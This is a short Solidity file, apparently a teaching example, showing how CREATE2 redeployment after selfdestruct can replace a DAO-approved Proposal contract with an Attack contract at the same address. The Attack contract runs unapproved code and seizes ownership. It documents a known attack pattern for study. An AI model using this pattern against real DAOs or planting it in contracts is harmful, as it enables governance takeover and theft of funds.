// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Deployer {
    event Log(address indexed addr);

    function deployProposal(uint256 salt) external {
        address addr = address(new Proposal{salt: bytes32(salt)}());
        emit Log(addr);
    }

    function deployAttack(uint256 salt) external {
        address addr = address(new Attack{salt: bytes32(salt)}());
        emit Log(addr);
    }
}

contract Proposal {
    event Log(string message);

    function executeProposal() external {
        emit Log("Executed code approved by DAO");
    }

    function emergencyStop() external {
        selfdestruct(payable(address(0)));
    }
}

contract Attack {
    event Log(string message);

    address public owner;

    function executeProposal() external {
        emit Log("Executed code not approved by DAO :)");
        owner = msg.sender;
    }
}
